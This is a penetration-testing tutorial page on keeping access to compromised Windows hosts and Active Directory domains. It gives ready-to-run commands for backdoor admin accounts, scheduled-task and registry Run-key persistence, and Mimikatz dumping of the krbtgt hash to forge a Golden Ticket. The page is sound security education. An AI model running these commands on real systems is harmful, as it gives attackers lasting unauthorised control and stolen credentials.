---
description: >-
  When a computer or even the entire domain is compromised, how do you keep it
  that way?                  (note: not normally required in a pentest)
---

# Persistence

## Local Computer

With administrative privileges on a computer, you can do anything. If we want to keep control of this computer, even after someone's password changes, for example, we can create some "backdoors".

One simple way is to **create a new local account** on the computer and give it the `BUILTIN\Administrators` group:

```powershell
net user $USERNAME $PASSWORD /add
net localgroup Administrators $USERNAME /add
```

This later allows you to log in as that user and dump cached creds like [#post-exploitation-mimikatz](local-privilege-escalation.md#post-exploitation-mimikatz "mention")

Another method is creating a scheduled task that executes hourly or in another period and runs a program that gives you a reverse shell, for example.&#x20;

<pre class="language-powershell"><code class="lang-powershell"># Run every 1 hour
<strong>schtasks /create /sc HOURLY /mo 1 /tn "Cleanup" /tr "C:\Windows\Tasks\backdoor.exe"
</strong># Run on startup, as the SYSTEM user
<strong>schtasks /create /sc ONSTART /tn "Cleanup" /ru "SYSTEM" /tr "C:\Windows\Tasks\backdoor.exe"
</strong></code></pre>

Then another classic is Autoruns, programs that register themselves to start on startup. You can place binaries or scripts in the following `shell:startup` directory, and they will execute on startup:

```powershell
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

The Windows Registry can also be a great sea of abusable keys that automatically run programs. The `Software\Microsoft\Windows\CurrentVersion\Run` path for `HKCU` and `HKLM` contains a key for every program that should start at startup, for only the current user or all users:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"># Run for the current user
<strong>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Cleanup" /t REG_SZ /d "C:\Windows\Tasks\backdoor.exe" /f
</strong># Run for all users
<strong>reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Cleanup" /t REG_SZ /d "C:\Windows\Tasks\backdoor.exe" /f
</strong></code></pre>

## Active Directory

When an entire active directory is compromised, a lot of integrity is lost. Any secrets can be read out, and later used to log in as any user after your access has been revoked. Here are some well-known attacks that real threat actors use to persist after a breach if all the required secrets are not rotated.&#x20;

### Golden Ticket

We've seen [#forge-silver-tickets](lateral-movement.md#forge-silver-tickets "mention") where we have the hash of an SPN and can forge a Kerberos ticket as any user for that service. Taking this one step further is possible when we compromise the **NTLM hash of the** `krbtgt` **user**. Because TGTs are encrypted with this secret, we can forge any ticket in the future if we know it.&#x20;

On the Domain Controller, we will ask the LSA server for all known credentials using Mimikatz:

<pre class="language-javascript"><code class="lang-javascript"><strong>mimikatz # privilege::debug
</strong>Privilege '20' OK

<strong>mimikatz # lsadump::lsa /patch
</strong>Domain : $DOMAIN / S-1-5-21-5386719015-7638691639-2457330780

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 8a772f3282654f2f9e165e19926a32a4

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
<strong>NTLM : 752da57f6d5047d6a251359025bd97e1
</strong>...
</code></pre>

This finds the NTLM hash for the `krbtgt` user which can now be used to forge any ticket. When the time comes after vulnerabilities have been patched, the attacker can still get a new valid session.

We provide the domain and its SID (found using `whoami /user`), then choose a user with a lot of privileges like a Domain Admin, and give the `krbtgt` NTLM hash:

<pre class="language-javascript" data-overflow="wrap"><code class="lang-javascript"><strong>mimikatz # kerberos::purge
</strong>Ticket(s) purge for current session is OK

<strong>mimikatz # kerberos::golden /ptt /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /user:jen /krbtgt:752da57f6d5047d6a251359025bd97e1
</strong>User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
</code></pre>

This injects it into our current session, and the newly spawned `cmd.exe` will allow you to do anything on the domain through Kerberos, like [#psexec-smb](lateral-movement.md#psexec-smb "mention") with a hostname instead of an IP to get a shell.&#x20;
